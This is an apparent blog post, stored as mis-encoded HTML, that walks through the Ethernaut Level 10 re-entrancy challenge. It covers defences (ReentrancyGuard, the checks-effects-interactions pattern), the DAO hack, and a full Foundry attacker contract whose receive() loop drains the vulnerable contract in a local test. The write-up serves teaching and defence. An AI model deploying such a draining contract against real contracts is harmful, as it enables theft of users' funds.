_amount) public noReentrant &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-ä½¿ç”¨-OpenZeppelin-çš„-ReentrancyGuard\"><a href=\"#3-ä½¿ç”¨-OpenZeppelin-çš„-ReentrancyGuard\" class=\"headerlink\" title=\"3. ä½¿ç”¨ OpenZeppelin çš„ ReentrancyGuard\"></a>3. ä½¿ç”¨ OpenZeppelin çš„ ReentrancyGuard</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeContract is ReentrancyGuard &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public nonReentrant &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-ä½¿ç”¨-transfer-è€Œé-call\"><a href=\"#4-ä½¿ç”¨-transfer-è€Œé-call\" class=\"headerlink\" title=\"4. ä½¿ç”¨ transfer() è€Œé call()\"></a>4. ä½¿ç”¨ transfer() è€Œé call()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âš ï¸ æœ‰é™é˜²æŠ¤ï¼ˆä¸æ¨èä½œä¸ºå”¯ä¸€é˜²æŠ¤æªæ–½ï¼‰</span><br><span class=\"line\">function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    balances[msg.sender] -= _amount;</span><br><span class=\"line\">    payable(msg.sender).transfer(_amount); // é™åˆ¶ Gas ä¸º 2300</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-é‡å…¥æ”»å‡»ç±»å‹\"><a href=\"#1-é‡å…¥æ”»å‡»ç±»å‹\" class=\"headerlink\" title=\"1. é‡å…¥æ”»å‡»ç±»å‹\"></a>1. é‡å…¥æ”»å‡»ç±»å‹</h3><table>\n<thead>\n<tr>\n<th>ç±»å‹</th>\n<th>æè¿°</th>\n<th>ç¤ºä¾‹</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>å•å‡½æ•°é‡å…¥</strong></td>\n<td>æ”»å‡»åŒä¸€ä¸ªå‡½æ•°</td>\n<td>æœ¬å…³å¡çš„ <code>withdraw()</code></td>\n</tr>\n<tr>\n<td><strong>è·¨å‡½æ•°é‡å…¥</strong></td>\n<td>æ”»å‡»ä¸åŒå‡½æ•°</td>\n<td><code>withdraw()</code> â†’ <code>transfer()</code></td>\n</tr>\n<tr>\n<td><strong>è·¨åˆçº¦é‡å…¥</strong></td>\n<td>æ”»å‡»ä¸åŒåˆçº¦</td>\n<td>DeFi åè®®é—´çš„å¤æ‚é‡å…¥</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-Gas-é™åˆ¶å¯¹æ¯”\"><a href=\"#2-Gas-é™åˆ¶å¯¹æ¯”\" class=\"headerlink\" title=\"2. Gas é™åˆ¶å¯¹æ¯”\"></a>2. Gas é™åˆ¶å¯¹æ¯”</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// transfer/send: 2300 gas (ä¸è¶³ä»¥è¿›è¡Œé‡å…¥)</span><br><span class=\"line\">payable(msg.sender).transfer(amount);</span><br><span class=\"line\"></span><br><span class=\"line\">// call: è½¬å‘æ‰€æœ‰å‰©ä½™ gas (å¯èƒ½å¯¼è‡´é‡å…¥)</span><br><span class=\"line\">(bool success,) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-çŠ¶æ€æ›´æ–°æ—¶åº\"><a href=\"#3-çŠ¶æ€æ›´æ–°æ—¶åº\" class=\"headerlink\" title=\"3. çŠ¶æ€æ›´æ–°æ—¶åº\"></a>3. çŠ¶æ€æ›´æ–°æ—¶åº</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ é”™è¯¯æ¨¡å¼</span><br><span class=\"line\">function vulnerable() public &#123;</span><br><span class=\"line\">    require(condition);        // Check</span><br><span class=\"line\">    externalCall();           // Interaction (å±é™©!)</span><br><span class=\"line\">    updateState();            // Effect (å¤ªæ™šäº†)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… æ­£ç¡®æ¨¡å¼</span><br><span class=\"line\">function secure() public &#123;</span><br><span class=\"line\">    require(condition);        // Check</span><br><span class=\"line\">    updateState();            // Effect (å…ˆæ›´æ–°çŠ¶æ€)</span><br><span class=\"line\">    externalCall();           // Interaction (å®‰å…¨)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›ï¸-å†å²æ¡ˆä¾‹\"><a href=\"#ğŸ›ï¸-å†å²æ¡ˆä¾‹\" class=\"headerlink\" title=\"ğŸ›ï¸ å†å²æ¡ˆä¾‹\"></a>ğŸ›ï¸ å†å²æ¡ˆä¾‹</h2><h3 id=\"The-DAO-æ”»å‡»-2016å¹´6æœˆ\"><a href=\"#The-DAO-æ”»å‡»-2016å¹´6æœˆ\" class=\"headerlink\" title=\"The DAO æ”»å‡» (2016å¹´6æœˆ)\"></a>The DAO æ”»å‡» (2016å¹´6æœˆ)</h3><ul>\n<li><strong>æŸå¤±</strong>: 360ä¸‡ ETH (å½“æ—¶ä»·å€¼çº¦6000ä¸‡ç¾å…ƒ)</li>\n<li><strong>åŸå› </strong>: splitDAO å‡½æ•°å­˜åœ¨é‡å…¥æ¼æ´</li>\n<li><strong>åæœ</strong>: ä»¥å¤ªåŠç¡¬åˆ†å‰ï¼Œäº§ç”Ÿ ETH å’Œ ETC</li>\n<li><strong>æ•™è®­</strong>: é‡å…¥æ”»å‡»çš„ç ´åæ€§å’Œé˜²æŠ¤é‡è¦æ€§</li>\n</ul>\n<h3 id=\"å…¶ä»–è‘—åæ¡ˆä¾‹\"><a href=\"#å…¶ä»–è‘—åæ¡ˆä¾‹\" class=\"headerlink\" title=\"å…¶ä»–è‘—åæ¡ˆä¾‹\"></a>å…¶ä»–è‘—åæ¡ˆä¾‹</h3><ol>\n<li><strong>Cream Finance</strong> (2021) - 1.3äº¿ç¾å…ƒæŸå¤±</li>\n<li><strong>bZx Protocol</strong> (2020) - å¤šæ¬¡é‡å…¥æ”»å‡»</li>\n<li><strong>Uniswap V1</strong> (æ—©æœŸç‰ˆæœ¬) - ç†è®ºæ¼æ´</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>é‡å…¥æ”»å‡»æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨çš„åŸºçŸ³çŸ¥è¯†ï¼š</p>\n<ul>\n<li>âœ… <strong>ç†è§£ CEI æ¨¡å¼çš„é‡è¦æ€§</strong></li>\n<li>âœ… <strong>æŒæ¡å¤šç§é˜²æŠ¤æªæ–½çš„ä½¿ç”¨</strong></li>\n<li>âœ… <strong>è®¤è¯†çŠ¶æ€ç®¡ç†çš„å…³é”®æ€§</strong></li>\n<li>âœ… <strong>å­¦ä¹ å†å²æ¡ˆä¾‹çš„æ•™è®­</strong></li>\n</ul>\n<p>é‡å…¥æ”»å‡»çœ‹ä¼¼ç®€å•ï¼Œä½†å…¶å˜ç§å’Œç»„åˆå½¢å¼åœ¨ç°ä»£ DeFi åè®®ä¸­ä»ç„¶æ˜¯ä¸»è¦å¨èƒã€‚æŒæ¡å…¶åŸç†å’Œé˜²æŠ¤æªæ–½æ˜¯æ¯ä¸ªæ™ºèƒ½åˆçº¦å¼€å‘è€…çš„å¿…ä¿®è¯¾ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">ä¸Šä¸€å…³: Level 9 - King</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">ä¸‹ä¸€å…³: Level 11 - Elevator</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>å®‰å…¨çš„åˆçº¦ä¸ä»…è¦åšæ­£ç¡®çš„äº‹ï¼Œè¿˜è¦ä»¥æ­£ç¡®çš„é¡ºåºåšäº‹ã€‚</em> ğŸ”</p>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-10-Re-entrancy-ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£\"><a href=\"#ğŸ¯-Ethernaut-Level-10-Re-entrancy-ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 10: Re-entrancy - ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£\"></a>ğŸ¯ Ethernaut Level 10: Re-entrancy - ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/10\">Ethernaut Level 10 - Re-entrancy</a><br><strong>æ”»å‡»ç±»å‹</strong>: é‡å…¥æ”»å‡» (Reentrancy Attack)<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†<br><strong>å†å²å½±å“</strong>: The DAO æ”»å‡»äº‹ä»¶ (2016å¹´)</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨é¢†åŸŸæœ€ç»å…¸çš„æ”»å‡»ç±»å‹ä¹‹ä¸€ï¼š</p>\n<ol>\n<li><strong>çªƒå–åˆçº¦èµ„é‡‘</strong> - æå–è¶…è¿‡è‡ªå·±å­˜æ¬¾é‡‘é¢çš„ä»¥å¤ªå¸</li>\n<li><strong>ç†è§£é‡å…¥åŸç†</strong> - æŒæ¡çŠ¶æ€æ›´æ–°æ—¶åºé—®é¢˜</li>\n<li><strong>å­¦ä¹ é˜²æŠ¤æªæ–½</strong> - äº†è§£å¦‚ä½•ç¼–å†™å®‰å…¨çš„ææ¬¾å‡½æ•°</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.12;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Reentrance &#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  using SafeMath for uint256;</span><br><span class=\"line\">  mapping(address =&gt; uint) public balances;</span><br><span class=\"line\"></span><br><span class=\"line\">  function donate(address _to) public payable &#123;</span><br><span class=\"line\">    balances[_to] = balances[_to].add(msg.value);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class=\"line\">    return balances[_who];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  // ğŸš¨ æ¼æ´å‡½æ•°</span><br><span class=\"line\">  function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class=\"line\">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class=\"line\">      if(result) &#123;</span><br><span class=\"line\">        balances[msg.sender] -= _amount;  // âŒ çŠ¶æ€æ›´æ–°åœ¨å¤–éƒ¨è°ƒç”¨ä¹‹å</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p>é‡å…¥æ”»å‡»çš„æ ¹æœ¬åŸå› æ˜¯ <strong>æ£€æŸ¥-æ•ˆæœ-äº¤äº’ (CEI)</strong> æ¨¡å¼çš„è¿åï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    // âœ… æ£€æŸ¥ (Check)</span><br><span class=\"line\">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // âŒ äº¤äº’ (Interaction) - è¿‡æ—©è¿›è¡Œå¤–éƒ¨è°ƒç”¨</span><br><span class=\"line\">        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if(result) &#123;</span><br><span class=\"line\">            // âŒ æ•ˆæœ (Effect) - çŠ¶æ€æ›´æ–°å¤ªæ™š</span><br><span class=\"line\">            balances[msg.sender] -= _amount;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»åŸç†\"><a href=\"#æ”»å‡»åŸç†\" class=\"headerlink\" title=\"æ”»å‡»åŸç†\"></a>æ”»å‡»åŸç†</h3><ol>\n<li><strong>æ¶æ„åˆçº¦å­˜æ¬¾</strong> - å‘ç›®æ ‡åˆçº¦å­˜å…¥å°‘é‡èµ„é‡‘</li>\n<li><strong>è°ƒç”¨ææ¬¾å‡½æ•°</strong> - è§¦å‘ <code>withdraw()</code> å‡½æ•°</li>\n<li><strong>æ¥æ”¶å›è°ƒ</strong> - åœ¨ <code>call</code> æ‰§è¡Œæ—¶è§¦å‘æ¶æ„åˆçº¦çš„ <code>receive()</code> å‡½æ•°</li>\n<li><strong>é€’å½’è°ƒç”¨</strong> - åœ¨çŠ¶æ€æ›´æ–°å‰å†æ¬¡è°ƒç”¨ <code>withdraw()</code></li>\n<li><strong>é‡å¤æå–</strong> - ç”±äºä½™é¢æœªæ›´æ–°ï¼Œå¯ä»¥å¤šæ¬¡æå–èµ„é‡‘</li>\n</ol>\n<h3 id=\"æ”»å‡»æµç¨‹å›¾\"><a href=\"#æ”»å‡»æµç¨‹å›¾\" class=\"headerlink\" title=\"æ”»å‡»æµç¨‹å›¾\"></a>æ”»å‡»æµç¨‹å›¾</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ç”¨æˆ·è°ƒç”¨ withdraw(1 ether)</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">æ£€æŸ¥ balances[attacker] &gt;= 1 ether âœ…</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">å‘é€ 1 ether åˆ°æ”»å‡»è€…åˆçº¦</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">æ”»å‡»è€…åˆçº¦çš„ receive() è¢«è§¦å‘</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">å†æ¬¡è°ƒç”¨ withdraw(1 ether)</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">æ£€æŸ¥ balances[attacker] &gt;= 1 ether âœ… (ä½™é¢æœªæ›´æ–°!)</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">å†æ¬¡å‘é€ 1 ether...</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">å¦‚æ­¤é‡å¤ï¼Œç›´åˆ°åˆçº¦ä½™é¢è€—å°½</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Reentrance.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ReentrancyAttacker &#123;</span><br><span class=\"line\">    Reentrance public target;</span><br><span class=\"line\">    uint public amount;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = Reentrance(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack() external payable &#123;</span><br><span class=\"line\">        amount = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤1: å…ˆå­˜å…¥ä¸€äº›èµ„é‡‘å»ºç«‹ä½™é¢</span><br><span class=\"line\">        target.donate&#123;value: amount&#125;(address(this));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤2: å¼€å§‹é‡å…¥æ”»å‡»</span><br><span class=\"line\">        target.withdraw(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // é‡å…¥æ”»å‡»çš„æ ¸å¿ƒ - receiveå‡½æ•°</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        if (address(target).balance &gt;= amount) &#123;</span><br><span class=\"line\">            // é€’å½’è°ƒç”¨withdrawï¼Œå®ç°é‡å…¥</span><br><span class=\"line\">            target.withdraw(amount);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getBalance() public view returns (uint) &#123;</span><br><span class=\"line\">        return address(this).balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ReentranceTest is Test &#123;</span><br><span class=\"line\">    Reentrance public reentrance;</span><br><span class=\"line\">    ReentrancyAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user1 = makeAddr(&quot;user1&quot;);</span><br><span class=\"line\">    address public user2 = makeAddr(&quot;user2&quot;);</span><br><span class=\"line\">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        reentrance = new Reentrance();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™ç”¨æˆ·ä¸€äº›åˆå§‹èµ„é‡‘</span><br><span class=\"line\">        vm.deal(user1, 10 ether);</span><br><span class=\"line\">        vm.deal(user2, 10 ether);</span><br><span class=\"line\">        vm.deal(attackerAddr, 2 ether);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·å­˜æ¬¾</span><br><span class=\"line\">        vm.prank(user1);</span><br><span class=\"line\">        reentrance.donate&#123;value: 5 ether&#125;(user1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.prank(user2);</span><br><span class=\"line\">        reentrance.donate&#123;value: 5 ether&#125;(user2);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker = new ReentrancyAttacker(address(reentrance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testReentrancyAttack() public &#123;</span><br><span class=\"line\">        uint256 contractBalanceBefore = address(reentrance).balance;</span><br><span class=\"line\">        uint256 attackerBalanceBefore = attackerAddr.balance;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;åˆçº¦ä½™é¢ (æ”»å‡»å‰):&quot;, contractBalanceBefore);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»è€…ä½™é¢ (æ”»å‡»å‰):&quot;, attackerBalanceBefore);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ‰§è¡Œé‡å…¥æ”»å‡»</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        uint256 contractBalanceAfter = address(reentrance).balance;</span><br><span class=\"line\">        uint256 attackerBalanceAfter = attacker.getBalance();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;åˆçº¦ä½™é¢ (æ”»å‡»å):&quot;, contractBalanceAfter);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»è€…ä½™é¢ (æ”»å‡»å):&quot;, attackerBalanceAfter);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(contractBalanceAfter, 0);</span><br><span class=\"line\">        assertGt(attackerBalanceAfter, 1 ether); // è·å¾—è¶…è¿‡æŠ•å…¥çš„èµ„é‡‘</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testReentrancyDetails() public &#123;</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è®°å½•æ¯æ¬¡withdrawè°ƒç”¨</span><br><span class=\"line\">        vm.recordLogs();</span><br><span class=\"line\">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 